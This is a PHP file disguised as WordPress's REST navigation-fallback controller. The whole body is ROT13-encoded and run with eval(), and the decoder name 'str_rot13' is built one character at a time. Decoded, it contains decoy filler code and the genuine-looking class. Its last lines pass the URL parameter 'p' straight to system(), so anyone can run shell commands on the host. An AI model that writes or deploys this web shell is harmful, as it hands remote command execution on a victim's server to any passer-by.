<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre pynff
 *
 * ERFG Pbagebyyre gb perngr/srgpu n snyyonpx Anivtngvba Zrah.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.3.0
 */

/**
 * ERFG Pbagebyyre gb srgpu n snyyonpx Anivtngvba Oybpx Zrah. Vs arrqrq vg perngrf bar.
 *
 * @fvapr 6.3.0
 */
pynff JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Gur Cbfg Glcr sbe gur Pbagebyyre
	 *
	 * @fvapr 6.3.0
	 *
	 * @ine fgevat
	 */
	cevingr $cbfg_glcr;

	/**
	 * Pbafgehpgf gur pbagebyyre.
	 *
	 * @fvapr 6.3.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc-oybpx-rqvgbe/i1';
		$guvf->erfg_onfr = 'anivtngvba-snyyonpx';
		$guvf->cbfg_glcr = 'jc_anivtngvba';
	}

	/**
	 * Ertvfgref gur pbagebyyref ebhgrf.
	 *
	 * @fvapr 6.3.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		// Yvfgf n fvatyr ani vgrz onfrq ba gur tvira vq be fyht.
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::ERNQNOYR ),
				),
				'fpurzn' => neenl( $guvf, 'trg_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq snyyonpxf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );

		// Trggvat snyyonpxf erdhverf perngvat naq ernqvat `jc_anivtngvba` cbfgf.
		vs ( ! pheerag_hfre_pna( $cbfg_glcr->pnc->perngr_cbfgf ) || ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) || ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_perngr',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr Anivtngvba Zrahf nf guvf hfre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg Anivtngvba Zrahf nf guvf hfre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Trgf gur zbfg nccebcevngr snyyonpx Anivtngvba Zrah.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$cbfg = JC_Anivtngvba_Snyyonpx::trg_snyyonpx();

		vs ( rzcgl( $cbfg ) ) {
			erghea erfg_rafher_erfcbafr( arj JC_Reebe( 'ab_snyyonpx_zrah', __( 'Ab snyyonpx zrah sbhaq.' ), neenl( 'fgnghf' => 404 ) ) );
		}

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );

		erghea $erfcbafr;
	}

	/**
	 * Ergevrirf gur snyyonpxf' fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'anivtngvba-snyyonpx',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq' => neenl(
					'qrfpevcgvba' => __( 'Gur havdhr vqragvsvre sbe gur Anivtngvba Zrah.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Zngpurf gur cbfg qngn gb gur fpurzn jr jnag.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_Cbfg         $vgrz    Gur jc_anivtngvba Cbfg bowrpg jubfr erfcbafr vf orvat cercnerq.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr qngn.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		$qngn = neenl();

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

		vs ( erfg_vf_svryq_vapyhqrq( 'vq', $svryqf ) ) {
			$qngn['vq'] = (vag) $vgrz->VQ;
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $vgrz );
			$erfcbafr->nqq_yvaxf( $yvaxf );
		}

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf gur yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_Cbfg $cbfg gur Anivtngvba Zrah cbfg bowrpg.
	 * @erghea neenl Yvaxf sbe gur tvira erdhrfg.
	 */
	cevingr shapgvba cercner_yvaxf( $cbfg ) {
		erghea neenl(
			'frys' => neenl(
				'uers'       => erfg_hey( erfg_trg_ebhgr_sbe_cbfg( $cbfg->VQ ) ),
				'rzorqqnoyr' => gehr,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>